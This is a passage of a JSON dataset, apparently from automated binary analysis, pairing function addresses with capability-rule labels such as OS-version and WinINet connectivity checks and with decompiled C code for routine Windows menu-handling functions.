    },
    "00454378": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454378(uint8_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint8_t uVar7;\n    uint in_stack_ffffff88;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint var_3ch;\n    uint lpmi;\n    uint var_32h;\n    uint32_t var_2eh;\n    uint32_t var_2ah;\n    uint32_t var_26h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_12h;\n    uint8_t var_6h;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack84 = 0x4545c9;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack88;\n    puVar1 = &stack0xfffffffc;\n    var_5h = param_1;\n    if (*(in_EAX + 0x3e) == '\\0') goto code_r0x004545ab;\n    fcn.00405504();\n    iVar4 = fcn.004563c8();\n    if (iVar4 < 1) {\n        if (*(in_EAX + 0x60) != 0) {\n            if ((*(in_EAX + 100) != 0) && (*(*(in_EAX + 100) + 100) == 0)) {\n                cVar3 = fcn.004047cc();\n                if (cVar3 != '\\0') goto code_r0x00454414;\n            }\n            fcn.00453968(0x4545e0, var_4h);\n            fcn.00405800(0);\n        }\n    }\n    else {\n        var_22h = fcn.0045487c();\n    }\ncode_r0x00454414:\n    uVar2 = sub.kernel32.dll_GetVersion();\n    uVar7 = uVar2 == 4;\n    if (uVar2 < 4) {\n        fcn.00405894();\n        uVar6 = *((uVar7 & 0x7f) * 4 + 0x4a4710) |\n                *(*(in_EAX + 0x48) * 4 + 0x4a4704) | *(*(in_EAX + 0x38) * 4 + 0x4a46f4) |\n                *(*(in_EAX + 0x39) * 4 + 0x4a46fc);\n        iVar4 = fcn.004563c8();\n        if (iVar4 < 1) {\n            uVar5 = fcn.004058fc();\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x400, *(in_EAX + 0x50), uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        else {\n            uVar5 = fcn.004058fc();\n            uVar5 = fcn.0045487c(uVar5);\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x410, uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        goto code_r0x004545ab;\n    }\n    lpmi = 0x2c;\n    var_32h = 0x3f;\n    iVar4 = fcn.00456988();\n    if (iVar4 == 0) {\ncode_r0x00454454:\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar3 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            uVar2 = cVar3 == '\\0';\n            if (uVar2) goto code_r0x0045446a;\n        }\n        var_6h = 0;\n        uVar2 = true;\n    }\n    else {\n        uVar2 = *(iVar4 + 0x40) == '\\0';\n        if (uVar2) {\n            iVar4 = fcn.00455f9c();\n            uVar2 = iVar4 == 0;\n            if (uVar2) goto code_r0x00454454;\n        }\ncode_r0x0045446a:\n        var_6h = 1;\n    }\n    fcn.00405894();\n    var_2eh = *((uVar2 & 0x7f) * 4 + 0x4a4744) | *(*(in_EAX + 0x3d) * 4 + 0x4a473c) | *(*(in_EAX + 0x48) * 4 + 0x4a4718)\n              | *(var_5h * 4 + 0x4a474c) | *(var_6h * 4 + 0x4a4754);\n    var_2ah = *(*(in_EAX + 0x38) * 4 + 0x4a4724) | *(*(in_EAX + 0x39) * 4 + 0x4a4734) |\n              *(*(in_EAX + 0x3a) * 4 + 0x4a472c);\n    var_26h = *(in_EAX + 0x50);\n    var_22h = 0;\n    var_1eh = 0;\n    var_1ah = 0;\n    var_12h = fcn.004058fc();\n    iVar4 = fcn.004563c8();\n    if (0 < iVar4) {\n        var_22h = fcn.0045487c();\n    }\n    sub.user32.dll_InsertMenuItemA(param_2, 0xffffffff, 0xffffffff, &lpmi);\n    in_stack_ffffff88 = param_2;\n    puVar1 = puStack80;\ncode_r0x004545ab:\n    puStack80 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff88;\n    fcn.0040546c(0x4545d0);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 1461
    },
    "0045474c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045474c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    if ((*(in_EAX + 7) & 8) != 0) {\n        return;\n    }\n    if ((*(in_EAX + 7) & 2) != 0) {\n        *(in_EAX + 0x1d) = 1;\n        return;\n    }\n    if (in_EAX[0x1b] != 0) {\n        fcn.0045474c();\n        return;\n    }\n    uVar2 = fcn.0045487c();\n    iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n    bVar5 = iVar3 == 0;\n    for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n        uVar2 = fcn.0045487c(iVar3 + -1, 0x400);\n        uVar4 = sub.user32.dll_GetMenuState();\n        if ((uVar4 & 4) == 0) {\n            uVar2 = fcn.0045487c(iVar3 + -1, 0x400);\n            sub.user32.dll_RemoveMenu();\n            bVar5 = true;\n        }\n    }\n    if (!bVar5) {\n        return;\n    }\n    if ((in_EAX[0x19] == 0) && (cVar1 = fcn.004047cc(uVar2),  cVar1 != '\\0')) {\n        uVar2 = fcn.0045487c();\n        iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n        if (iVar3 == 0) {\n            sub.user32.dll_DestroyMenu(in_EAX[0xd]);\n            in_EAX[0xd] = 0;\n            goto code_r0x0045480c;\n        }\n    }\n    fcn.0045460c();\ncode_r0x0045480c:\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 473
    },
    "0045487c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045487c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x34) == 0) {\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            uVar2 = sub.user32.dll_CreateMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        else {\n            uVar2 = sub.user32.dll_CreatePopupMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        if (*(in_EAX + 0x34) == 0) {\n            fcn.004538bc();\n        }\n        fcn.0045460c();\n    }\n    return *(in_EAX + 0x34);\n}\n",
        "token_count": 187
    },
    "00454b24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00454b24(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    if (*(in_EAX + 0x92) != 0) {\n        (**(in_EAX + 0x90))(arg_8h, &var_10h);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00455f9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00455f9c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    for (iVar1 = *(in_EAX + 100); (iVar1 != 0 && (*(iVar1 + 0x7c) == 0)); iVar1 = *(iVar1 + 100)) {\n    }\n    if (iVar1 == 0) {\n        iVar1 = fcn.00456988();\n        if (iVar1 != 0) {\n            uVar2 = *(iVar1 + 0x48);\n        }\n    }\n    else {\n        uVar2 = *(iVar1 + 0x7c);\n    }\n    return uVar2;\n}\n",
        "token_count": 167
    },
    "00456018": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456018(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *in_FS_OFFSET;\n    bool bVar5;\n    uchar uVar6;\n    uint32_t uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack60 = 0x4561fa;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack64;\n    fcn.0040483c();\n    cVar2 = fcn.004047cc();\n    bVar5 = cVar2 == '\\0';\n    if (bVar5) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = bVar5;\n        fcn.00455fcc(&stack0xfffffffc);\n    }\n    bVar5 = !bVar5;\n    iVar3 = fcn.00456988();\n    var_10h = fcn.00455f9c();\n    fcn.00405894();\n    if (uVar6) {\n        *arg_8h = 5;\n        *var_4h = -2;\n        bVar1 = false;\n    }\n    else if ((var_10h == 0) || ((0x7fffffff < *(in_EAX + 0x40) && (bVar5)))) {\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar2 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            if (cVar2 == '\\0') {\n                *var_4h = 0x10;\n                if (!bVar5) {\n                    *arg_8h = 0x10;\n                }\n                bVar1 = true;\n                goto code_r0x00456103;\n            }\n        }\n        *var_4h = -7;\n        bVar1 = false;\n    }\n    else {\n        *var_4h = *(var_10h + 0x34);\n        if (!bVar5) {\n            *arg_8h = *(var_10h + 0x30);\n        }\n        bVar1 = true;\n    }\ncode_r0x00456103:\n    if ((bVar1) && (!bVar5)) {\n        *var_4h = *var_4h + 0xf;\n    }\n    if (!bVar5) {\n        *arg_8h = *arg_8h + 3;\n    }\n    fcn.00403ae4();\n    if (iVar3 == 0) {\n        cVar2 = fcn.004047cc();\n        if (cVar2 == '\\0') {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = *0x60;\n        }\n    }\n    else {\n        uVar4 = 0;\n    }\n    if (*(in_EAX + 0x60) == 0) {\n        fcn.00405504();\n    }\n    else {\n        fcn.00453968();\n        fcn.00405784();\n    }\n    uVar4 = *(uVar4 * 2 + 0x4a476c) | 0x560;\n    fcn.0045490c(uVar4, 0, &var_20h);\n    *var_4h = *var_4h + (var_18h - var_20h) + 7;\n    if (*(in_EAX + 0xa2) != 0) {\n        (**(in_EAX + 0xa0))(arg_8h, var_4h);\n    }\n    *in_FS_OFFSET = uVar4;\n    fcn.0040546c(0x456201);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 940
    },
    "00456254": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00456254(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 100) != 0) && (iVar1 = fcn.004563c8(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.004563d8();\n            if ((in_EAX != iVar2) && ((*(iVar2 + 0x3d) != '\\0' && (*(iVar2 + 0x3f) == *(in_EAX + 0x3f))))) {\n                fcn.004562a0();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "004562a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004562a0(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 != *(in_EAX + 0x38)) {\n        *(in_EAX + 0x38) = param_2;\n        if ((*(in_EAX + 100) != 0) && ((*(in_EAX + 0x1c) & 2) == 0)) {\n            uVar1 = fcn.0045487c(*(in_EAX + 0x50), *(param_2 * 4 + 0x4a46f4));\n            sub.user32.dll_CheckMenuItem(uVar1);\n        }\n        if ((param_2 != 0) && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.00456254();\n        }\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "004562f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004562f4(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == *(in_EAX + 0x39)) {\n        return;\n    }\n    *(in_EAX + 0x39) = param_2;\n    if (((**0x4a5164 != 2) || (iVar1 = fcn.004563c8(),  iVar1 == 0)) &&\n       ((in_EAX[0x19] == 0 || (*(in_EAX[0x19] + 0x6c) == 0)))) {\n        if ((in_EAX[0x19] != 0) && ((*(in_EAX + 7) & 2) == 0)) {\n            uVar2 = fcn.0045487c(*(in_EAX + 0x14), *(param_2 * 4 + 0x4a46fc));\n            sub.user32.dll_EnableMenuItem(uVar2);\n        }\n        (**(*in_EAX + 0x3c))();\n        return;\n    }\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 278
    },
    "0045636c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045636c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x3f)) {\n        if (*(in_EAX + 100) != 0) {\n            fcn.00456730();\n            fcn.0045481c();\n        }\n        *(in_EAX + 0x3f) = param_2;\n        if ((*(in_EAX + 0x38) != '\\0') && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.00456254();\n        }\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "004563d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004563d8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) == 0) {\n        fcn.004538bc();\n    }\n    fcn.00419610();\n    return;\n}\n",
        "token_count": 61
    },
    "00456554": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456554(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*(param_1 + 100) != 0) {\n        fcn.004538bc();\n    }\n    if (in_EAX[0x17] == 0) {\n        iVar1 = fcn.00404610();\n        in_EAX[0x17] = iVar1;\n    }\n    if ((-1 < param_2 + -1) && (param_2 + -1 < *(in_EAX[0x17] + 8))) {\n        iVar1 = fcn.00419610();\n        if (*(param_1 + 0x3f) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(param_1 + 0x3f)) {\n            fcn.00419610();\n            fcn.0045636c();\n        }\n    }\n    fcn.0045481c();\n    fcn.0041968c();\n    *(param_1 + 100) = in_EAX;\n    *(param_1 + 0x84) = in_EAX;\n    *(param_1 + 0x80) = fcn.004567d0;\n    if (in_EAX[0xd] != 0) {\n        fcn.0045474c();\n    }\n    fcn.004563c8();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 346
    },
    "0045660c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045660c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((-1 < param_2) && (in_EAX[0x17] != 0)) {\n        iVar1 = fcn.004563c8();\n        if (param_2 < iVar1) goto code_r0x00456632;\n    }\n    fcn.004538bc();\ncode_r0x00456632:\n    iVar1 = fcn.00419610();\n    fcn.00419504();\n    *(iVar1 + 100) = 0;\n    *(iVar1 + 0x80) = 0;\n    *(iVar1 + 0x84) = 0;\n    if (in_EAX[0xd] != 0) {\n        fcn.0045474c();\n    }\n    fcn.004563c8();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 227
    },
    "004567d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004567d0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if ((arg_8h != '\\0') && ((*(in_EAX + 0x34) != 0 || (*(in_EAX + 0x6c) != 0)))) {\n        fcn.0045474c();\n    }\n    if (*(in_EAX + 100) == 0) {\n        cVar1 = fcn.004047cc();\n        if (cVar1 != '\\0') {\n            fcn.00458754();\n        }\n    }\n    else {\n        fcn.004567d0(0);\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "0045749c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045749c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uStack24;\n    int32_t iStack20;\n    \n    uStack24 = 0;\n    if ((param_2 != '\\0') || (((*(in_EAX + 0x1c) & 0x10) == 0 && (cVar1 = fcn.00457624(),  cVar1 != '\\0')))) {\n        iStack20 = 0;\n        iVar5 = 0;\n        iVar4 = 0;\n        iVar2 = fcn.004563c8();\n        iVar3 = iStack20;\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.004563d8();\n                if (*(iVar3 + 0x3e) != '\\0') {\n                    fcn.004563d8();\n                    cVar1 = fcn.00457478();\n                    iVar3 = iVar4;\n                    if (cVar1 == '\\0') break;\n                    iVar3 = fcn.004563d8();\n                    *(iVar3 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar4 = iVar4 + 1;\n                iVar2 = iVar2 + -1;\n                iVar3 = iStack20;\n            } while (iVar2 != 0);\n        }\n        iStack20 = iVar3;\n        iVar4 = fcn.004563c8();\n        if (iStack20 <= iVar4 + -1) {\n            iVar3 = ((iVar4 + -1) - iStack20) + 1;\n            iVar4 = iStack20;\n            do {\n                fcn.004563d8();\n                cVar1 = fcn.00457478();\n                if (cVar1 == '\\0') {\n                    iVar2 = fcn.004563d8();\n                    if (*(iVar2 + 0x3e) != '\\0') {\n                        if ((iVar5 != 0) && (*(iVar5 + 0x3e) == '\\0')) {\n                            *(iVar5 + 0x3e) = 1;\n                            uStack24 = 1;\n                        }\n                        iVar5 = 0;\n                        iStack20 = iVar4;\n                    }\n                }\n                else {\n                    if ((iVar5 != 0) && (*(iVar5 + 0x3e) != '\\0')) {\n                        *(iVar5 + 0x3e) = 0;\n                        uStack24 = 1;\n                    }\n                    iVar5 = fcn.004563d8();\n                }\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar4 = fcn.004563c8();\n        iVar3 = iStack20 - (iVar4 + -1);\n        if (iVar3 == 0 || iStack20 < iVar4 + -1) {\n            iVar3 = iVar3 + -1;\n            do {\n                iVar4 = fcn.004563d8();\n                if (*(iVar4 + 0x3e) != '\\0') {\n                    fcn.004563d8();\n                    cVar1 = fcn.00457478();\n                    if (cVar1 == '\\0') break;\n                    iVar4 = fcn.004563d8();\n                    *(iVar4 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 != 0);\n        }\n    }\n    return CONCAT44(iStack20, uStack24);\n}\n",
        "token_count": 837
    },
    "004575f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.004575f4(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3b);\n    if ((*(in_EAX + 0x3b) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.004575f4();\n        uVar1 = *((uVar1 & 0x7f) + 0x4a46a4);\n    }\n    return *((uVar1 & 0x7f) + 0x4a46a8);\n}\n",
        "token_count": 142
    },
    "00457624": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00457624(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3c);\n    if ((*(in_EAX + 0x3c) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.00457624();\n        uVar1 = *((uVar1 & 0x7f) + 0x4a46a4);\n    }\n    return *((uVar1 & 0x7f) + 0x4a46a8);\n}\n",
        "token_count": 140
    },
    "00457654": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.00457654(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    iVar1 = fcn.00454248();\n    in_EAX[0xd] = iVar1;\n    *(iVar1 + 0x84) = in_EAX;\n    *(iVar1 + 0x80) = *(*in_EAX + 0x38);\n    *(iVar1 + 0x70) = in_EAX;\n    iVar1 = fcn.00404610();\n    in_EAX[0x11] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x458194;\n    *(in_EAX + 0x41) = 1;\n    fcn.0041f670();\n    iVar1 = in_EAX[0xd];\n    *(iVar1 + 0x3b) = 0;\n    *(iVar1 + 0x3c) = 0;\n    fcn.00458604();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 355
    },
    "004577b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.004577b4(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((*(arg_8h + -1) == '\\0') && (*(arg_8h + -8) == *(in_EAX + 0x50))) ||\n        ((*(arg_8h + -1) == '\\x01' && (*(arg_8h + -8) == *(in_EAX + 0x34))))) ||\n       ((*(arg_8h + -1) == '\\x02' && (*(arg_8h + -8) == *(in_EAX + 0x60))))) {\n        *(arg_8h + -0xc) = in_EAX;\n        var_1h._0_1_ = 1;\n    }\n    else {\n        iVar2 = fcn.004563c8();\n        if (-1 < iVar2 + -1) {\n            do {\n                arg_8h_00 = arg_8h;\n                fcn.004563d8();\n                cVar1 = fcn.004577b4(arg_8h_00);\n                if (cVar1 != '\\0') {\n                    return 1;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 369
    },
    "0045787c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045787c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    char cStack20;\n    \n    uVar3 = 0;\n    cStack20 = param_1;\n    if (((cStack20 == '\\0') && (cVar1 = fcn.004047cc(),  cVar1 != '\\0')) &&\n       (iVar2 = (**(*in_EAX + 0x34))(),  param_2 == iVar2)) {\n        uVar3 = fcn.00458e20();\n    }\n    else {\n        for (iVar2 = fcn.0045784c(); (iVar2 != 0 && (*(iVar2 + 0x54) == 0)); iVar2 = *(iVar2 + 100)) {\n        }\n        if (iVar2 != 0) {\n            uVar3 = *(iVar2 + 0x54);\n        }\n    }\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 240
    },
    "004579d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004579d0(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x40) == '\\0') && (*(in_EAX + 0x48) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 67
    },
    "00457c24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
